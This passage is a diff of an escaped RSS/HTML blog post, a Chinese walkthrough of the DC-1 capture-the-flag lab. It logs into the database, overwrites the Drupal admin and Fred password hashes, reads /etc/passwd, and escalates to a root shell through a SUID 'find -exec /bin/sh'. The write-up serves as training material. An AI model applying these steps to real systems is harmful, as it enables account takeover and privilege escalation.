 &lt;h1 id=&#34;数据库渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库渗透&#34;&gt;#&lt;/a&gt; 数据库渗透&lt;/h1&gt;
 &lt;p&gt;接下来我们可以尝试登录：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;mysql -udbuser -pR0ck3t&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/23.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/23.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;在数据库里面我们可以利用&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 使用drupal数据库&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;use drupaldb&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 查看所有表&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;show tables;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/24.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/24.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;找到有一个users表&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;select * from users&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/26.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/26.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;可以看到对密码进行了加密，得到了两个用户和两组密码，我们需要通过修改用户密码来进行登录，修改密码的话首先需要找到加密文件&lt;/p&gt;
 &lt;p&gt;参考：&lt;a href=&#34;https://drupalchina.cn/node/2128&#34;&gt;分享：忘记Drupal的管理员密码的解决办法 | Drupal中国&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;通过drupal加密密码的脚本加密一个知道的密码，把加密得到的字符串和admin的pass进行替换，加密文件脚本路径在&lt;code&gt;/var/www/scripts/password-hash.sh&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/27.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/27.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&#34;color:#AB5959;--shiki-dark:#CB7676&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt;php&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#A0ADA0;--shiki-dark:#758575DD&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;
@@ -379,32 +379,32 @@
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#998418;--shiki-dark:#B8A965&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt;&#34;&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt;&#34;&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;这个脚本用php写的，还能用php加参数运行，直接得到加密后的密码&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;php /var/www/scripts/password-hash.sh 123456&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/28.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/28.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;password: 123456                hash: $S$DZ2zFTmLqUjiqAHV4tC./mSLaDrIV3vGS//oJrwN/iqRx.vDhZEM&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;接下来我们试着把admin和Fred用户的密码更换为这个hash值&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;UPDATE users SET pass = &#34;$S$DZ2zFTmLqUjiqAHV4tC./mSLaDrIV3vGS//oJrwN/iqRx.vDhZEM&#34; where name = &#39;admin&#39; or name = &#39;Fred&#39;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/29.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/29.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;接下来我们可以尝试直接在网站里面用账户密码登录：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/30.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/30.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;登录进去在File Content栏就能看到flag3了，提示了passwd和shadow，为Linux文件&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;特殊的权限设置有助于找到密码--但您需要执行该命令来弄清楚如何获取所需的内容&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/etc/passwd：该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;/etc/shadow：该文件存储了系统用户的密码等信息，只有root权限用户才能读取&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/31.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/31.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;在&lt;code&gt;/etc/passwd&lt;/code&gt;的最末尾我们看到了flag4这个用户，由于shadow文件需要root权限，所以我们需要用到提权，这里用常见的SUID提权：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 查找SUID权限的文件&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;find / -perm -u=s -type f 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/33.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/33.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;我们可以用比较常用的find命令进行提权：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;find / -name index.php -exec &#34;/bin/sh&#34; \;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;查找什么文件并不重要，重要的是这个文件得存在&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/32.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/32.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;接下来就是找最后的flag了：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;cd /root&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;ls&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;cat thefinalflag.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/34.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/34.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
